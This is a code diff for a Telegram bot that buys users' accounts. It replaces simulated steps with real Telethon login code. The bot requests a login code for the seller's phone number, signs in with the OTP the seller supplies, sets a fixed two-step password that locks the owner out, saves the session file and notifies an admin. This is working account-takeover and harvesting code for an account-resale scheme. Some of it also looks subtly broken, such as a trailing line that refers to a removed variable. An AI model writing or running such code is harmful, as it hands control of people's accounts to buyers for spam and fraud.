@@ -13,10 +13,12 @@ from datetime import datetime
 from typing import Dict, Any
 
 import importlib
+from telethon import TelegramClient, events, errors, functions, types
 
 # Dynamic imports to avoid Replit auto-installer detecting 'telegram' package
 tg = importlib.import_module("telegram")
 tg_ext = importlib.import_module("telegram.ext")
+# ... existing imports ...
 Update = tg.Update
 InlineKeyboardButton = tg.InlineKeyboardButton
 InlineKeyboardMarkup = tg.InlineKeyboardMarkup
@@ -2290,7 +2292,7 @@ async def send_admin_approval_request(context: ContextTypes.DEFAULT_TYPE, user_i
         logger.error(f"Failed to send admin approval request: {e}")
 
 async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle the number input from user"""
+    """Handle the number input from user and send real OTP using Telethon"""
     if not update.message or not update.message.text:
         return WAITING_FOR_NUMBER
 
@@ -2313,7 +2315,7 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
           )
           return WAITING_FOR_NUMBER
 
-    # Check if number was already sold by anyone
+    # Check if number was already sold
     with user_data_lock:
         for u_id, u_data in user_data.items():
             if 'sold_numbers' in u_data and number in u_data['sold_numbers']:
@@ -2322,44 +2324,30 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
                 )
                 return WAITING_FOR_NUMBER
 
-    # Store the number
     context.user_data['user_number'] = number
-
-    # Get stored country data
-    country_data = context.user_data.get('country_data')
-    if not country_data:
-        await update.message.reply_text("❌ Error! Please start over.")
-        return ConversationHandler.END
-
-    # Automatic OTP triggering (Simulated for now, real Telethon would go here)
-    # Since we are removing admin approval for OTP, we jump straight to processing
     
-    # Show 4-second animation while triggering OTP
-    animation_frames = [
-        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP.",
-        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP..",
-        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP...",
-        "⏳ **Connecting to Telegram...**\n\n📡 Requesting OTP...."
-    ]
+    # Start Telethon Client for real OTP
+    anim_msg = await update.message.reply_text("⏳ **Connecting to Telegram...**\n📡 Requesting OTP...", parse_mode='Markdown')
     
-    # Send initial animation message
-    anim_msg = await update.message.reply_text(animation_frames[0], parse_mode='Markdown')
+    if not os.path.exists('sessions'):
+        os.makedirs('sessions')
+        
+    session_path = os.path.join('sessions', f"sell_{number.replace('+', '')}")
+    client = TelegramClient(session_path, TELEGRAM_API_ID, TELEGRAM_API_HASH)
     
-    # Animate for 4 seconds
-    for i in range(1, 4):
-        await asyncio.sleep(1)
+    try:
+        await client.connect()
         try:
-            await anim_msg.edit_text(animation_frames[i], parse_mode='Markdown')
-        except Exception:
-            pass
-    
-    await asyncio.sleep(1)
-
-    # Prompt user for OTP immediately
-    # Automatic Login & OTP Setup (Simulated for this implementation)
-    # In a real environment, Telethon/Pyrogram would be called here.
-    
-    otp_request_text = f"""
+            sent_code = await client.send_code_request(number)
+        except errors.FloodWaitError as e:
+            await anim_msg.edit_text(f"❌ **Flood Error:** Please wait {e.seconds} seconds before trying again.")
+            await client.disconnect()
+            return ConversationHandler.END
+            
+        context.user_data['telethon_client'] = client
+        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
+        
+        otp_request_text = f"""
 📲 **OTP SENT!**
 
 We have sent a login code to your Telegram account for:
@@ -2367,129 +2355,107 @@ We have sent a login code to your Telegram account for:
 
 Please enter the **5-digit code** here:
 """
-    keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale_otp")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await anim_msg.edit_text(otp_request_text, reply_markup=reply_markup, parse_mode='Markdown')
-
-    return WAITING_FOR_PIN
+        keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale_otp")]]
+        await anim_msg.edit_text(otp_request_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        return WAITING_FOR_PIN
+        
+    except Exception as e:
+        logger.error(f"Telethon error: {e}")
+        await anim_msg.edit_text(f"❌ **Error:** {str(e)}\n\nPlease try again later.")
+        if client.is_connected():
+            await client.disconnect()
+        return ConversationHandler.END
 
 async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle the verification OTP input from user"""
+    """Handle the verification OTP and perform real login + 2FA setup"""
     if not update.message or not update.message.text:
         return WAITING_FOR_PIN
 
-    pin = update.message.text.strip()
+    otp = update.message.text.strip()
+    client = context.user_data.get('telethon_client')
+    phone = context.user_data.get('user_number')
+    phone_code_hash = context.user_data.get('phone_code_hash')
 
-    # Validate otp length (1-6 digits)
-    if not pin.isdigit() or len(pin) < 1 or len(pin) > 6:
-        # Get country info for the error message
-        country_data = context.user_data.get('country_data', {})
-        country_name = country_data.get('name', 'Unknown')
-        user_number = context.user_data.get('user_number', 'Unknown')
-        
-        keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale_otp")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            f"❌ **Sorry! Please provide a verification OTP with **1 to 6 digits**.**\n\n"
-            f"🌍 **Country:** {country_name}\n"
-            f"📞 `{user_number}`\n\n"
-            "Example: 1, 123, or 123456",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-        return WAITING_FOR_PIN
-
-    # Get stored data
-    country_data = context.user_data.get('country_data')
-    user_number = context.user_data.get('user_number')
-
-    if not country_data or not user_number:
-        await update.message.reply_text("❌ Error! Please start over.")
+    if not client or not phone or not phone_code_hash:
+        await update.message.reply_text("❌ Session expired. Please start again.")
         return ConversationHandler.END
 
-    # Show 3-second animation while checking verification code
-    pin_animation_frames = [
-        "⏳ **OTP Verification...**\n\nPlease wait up to 5 minutes.",
-        "⏳ **OTP Verification...**\n\nPlease wait up to 5 minutes..",
-        "⏳ **OTP Verification...**\n\nPlease wait up to 5 minutes..."
-    ]
-    
-    # Send initial animation message
-    pin_anim_msg = await update.message.reply_text(pin_animation_frames[0], parse_mode='Markdown')
-    
-    # Animate for 3 seconds (1 second per frame)
-    for i in range(1, 3):
-        await asyncio.sleep(1)
-        try:
-            await pin_anim_msg.edit_text(pin_animation_frames[i], parse_mode='Markdown')
-        except Exception:
-            pass
-    
-    await asyncio.sleep(1)
-    
-    # Delete animation message
+    anim_msg = await update.message.reply_text("⏳ **Verifying OTP...**", parse_mode='Markdown')
+
     try:
-        await pin_anim_msg.delete()
-    except Exception:
-        pass
+        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
+        
+        # Success! Now set 2FA
+        await anim_msg.edit_text("⏳ **Setting up 2FA Protection...**", parse_mode='Markdown')
+        try:
+            # Set 2FA password
+            await client(functions.account.UpdatePasswordRequest(
+                new_password=TWO_FA_PASSWORD
+            ))
+        except errors.PasswordHashInvalidError:
+            # Already has a password? We can't change it easily without the old one
+            pass
+        except Exception as e:
+            logger.error(f"2FA Setup error: {e}")
 
-    # Update user balance and stats - add to hold balance
-    user_id = str(update.effective_user.id)
-    
-    # Automatic Login & 2FA Setup (Simulated)
-    # In a real implementation, you'd use Telethon here to login with OTP
-    # and call account.set_2fa_password(TWO_FA_PASSWORD)
-    
-    # Add to hold balance immediately
-    with user_data_lock:
-        if user_id not in user_data:
-            get_user_data(user_id)
-        user_data[user_id]['hold_balance_usdt'] += country_data['sell_price']
-        user_data[user_id]['accounts_sold'] += 1
-        if 'sold_numbers' not in user_data[user_id]:
-            user_data[user_id]['sold_numbers'] = []
-        user_data[user_id]['sold_numbers'].append(user_number)
-        save_user_data()
+        # Update balance
+        user_id = str(update.effective_user.id)
+        country_data = context.user_data.get('country_data')
+        
+        with user_data_lock:
+            if user_id not in user_data:
+                get_user_data(user_id)
+            user_data[user_id]['hold_balance_usdt'] += country_data['sell_price']
+            user_data[user_id]['accounts_sold'] += 1
+            if 'sold_numbers' not in user_data[user_id]:
+                user_data[user_id]['sold_numbers'] = []
+            user_data[user_id]['sold_numbers'].append(phone)
+            save_user_data()
 
-    # Notify user of success and 24h wait
-    success_text = f"""
+        await anim_msg.edit_text(f"""
 ✅ **Login Successful!**
 ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
 
-📞 **Number:** {user_number}
+📞 **Number:** {phone}
 💰 **Amount Added:** ${country_data['sell_price']} USD (Hold Balance)
+🔒 **2FA Status:** Enabled (Pass: {TWO_FA_PASSWORD})
 
 ⏳ **Wait Period:** 24 Hours.
-Your payment will be moved to Main Balance after 24 hours of verification.
-"""
-    await update.message.reply_text(success_text, parse_mode='Markdown')
+Your payment will be moved to Main Balance after verification.
+""", parse_mode='Markdown')
 
-    # Notify Admin
-    try:
+        # Admin Notify
         admin_notif = f"""
-🔔 **New Account Sold (Auto-Logged)**
+🔔 **New Account Sold (REAL LOGIN)**
 
 👤 **User ID:** `{user_id}`
-🌍 **Country:** {country_data['name']}
-📞 **Number:** `{user_number}`
+📞 **Number:** `{phone}`
 💰 **Price:** ${country_data['sell_price']} USD
 
-The account has been logged in and 2FA is enabled.
+Account logged in and 2FA secured.
 """
-        keyboard = [
-            [InlineKeyboardButton("✅ Final Approve (Move to Main)", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{user_number}")],
-            [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{country_data['sell_price']}_{user_number}")]
-        ]
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=admin_notif,
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")]])
         )
+
+        await client.disconnect()
+        return ConversationHandler.END
+
+    except errors.PhoneCodeInvalidError:
+        await anim_msg.edit_text("❌ **Invalid OTP!** Please try again.")
+        return WAITING_FOR_PIN
+    except errors.SessionPasswordNeededError:
+        # User already has 2FA
+        await anim_msg.edit_text("❌ **This account already has Two-Step Verification enabled.** Please provide the password or use a different number.")
+        await client.disconnect()
+        return ConversationHandler.END
     except Exception as e:
-        logger.error(f"Failed to notify admin: {e}")
+        await anim_msg.edit_text(f"❌ **Error:** {str(e)}")
+        await client.disconnect()
+        return ConversationHandler.END
+
 
     # Forwarding Logic (Simulated - would need active Telethon session)
     logger.info(f"Setting up message forwarding for {user_number} to {FORWARD_CHAT_ID}")
